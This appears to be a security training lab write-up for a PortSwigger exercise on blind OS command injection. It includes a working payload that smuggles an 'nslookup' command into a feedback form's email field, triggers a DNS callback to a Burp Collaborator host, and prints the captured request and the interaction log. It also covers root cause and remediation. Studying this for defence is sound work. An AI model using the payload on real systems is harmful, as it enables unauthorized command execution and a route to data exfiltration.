# Lab 04 — Blind OS Command Injection with Out-of-Band Interaction

## 1. Overview

| Field | Value |
|---|---|
| Vulnerability Class | OS Command Injection (Blind / Out-of-Band — OAST) |
| CWE | CWE-78 |
| Difficulty | Practitioner |
| Source | PortSwigger Web Security Academy |
| Objective | Trigger a DNS lookup to Burp Collaborator to prove command execution |

## 3. Scenario Constraints

Unlike Lab 02 and Lab 03, here:
- The injected command executes **asynchronously** — it has no effect on the application's response, so time-delay payloads don't work.
- There is **no writable/servable directory** available, so output redirection doesn't work either.

This forces the use of **out-of-band (OAST)** techniques: forcing the server to make a network callback (a DNS lookup) to an external system under the attacker's control.

## 2. Summary

The feedback function is vulnerable to blind command injection, but the command runs in a background task queue, decoupled from the HTTP response. Because neither time-based nor file-based detection applies, the only reliable confirmation method is to make the server perform a DNS lookup against a unique Burp Collaborator subdomain. DNS (UDP/53) is frequently permitted outbound even when HTTP/HTTPS egress is firewalled, making it the most dependable OAST channel.

## 3. Proof of Concept (PoC)

1. In Burp Suite, open the **Collaborator** tab and click **Copy to clipboard** to generate a unique Collaborator subdomain.
2. Submit the feedback form with dummy data, capture `POST /feedback/submit`, and send it to Repeater.
3. Modify the `email` parameter:
   ```
   email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
   ```
   (Right-click the subdomain placeholder → **Insert Collaborator payload**.)
4. Send the request (it returns immediately, since execution is asynchronous).
5. Return to the **Collaborator** tab and click **Poll now**.
6. Confirm one or more DNS interactions originating from the lab's backend.

## 4. Evidence

**Injection request:**
```
POST /feedback/submit HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<token>&name=test&email=x||nslookup+x.je3k2z1x9c1y2b3.oastify.com||&subject=test&message=test
```

**Collaborator client — interaction log:**
```
Type: DNS
Interaction: A record lookup
Source IP: <lab-server-IP>
Domain: x.je3k2z1x9c1y2b3.oastify.com
```

The presence of this interaction confirms server-side execution of the injected `nslookup` command and solves the lab.

## 5. Root Cause Analysis

**Attacker perspective:** The malformed first command (`x`) fails, so `||nslookup x.<collaborator-subdomain>||` executes. `nslookup` resolves the attacker-controlled subdomain, causing the server's DNS resolver to query the Collaborator server, which logs the interaction — independent of whatever the HTTP response contains.

**Defender perspective:** The application's asynchronous processing architecture was likely designed for performance/reliability (decoupling feedback processing from the request/response cycle), but it inadvertently removes the easiest detection signals (timing, reflected output), giving a false sense of security. Egress DNS is rarely restricted as tightly as HTTP/HTTPS, so it remains exploitable even in segmented environments.

## 6. Impact

This confirms full arbitrary command execution on an internal/backend host, even in a hardened, segmented environment with no reflected output and no writable web-accessible storage. It is a stepping stone to active data exfiltration (see Lab 05) and potential lateral movement if the compromised host can reach other internal systems via DNS or other allowed egress channels.

## 7. Remediation

- Remove the shell invocation from the feedback pipeline entirely.
- Restrict outbound DNS resolution on backend/application servers to only the organization's internal resolvers — block arbitrary external domain lookups where feasible.
- Apply egress filtering/firewalling at the network layer so that application servers cannot freely resolve or connect to arbitrary external hosts.
- Validate and sanitise all fields reaching system calls, regardless of whether output is visible to the end user.

## 8. References

- [PortSwigger — Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection)
- [Burp Collaborator documentation](https://portswigger.net/burp/documentation/collaborator)
- [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
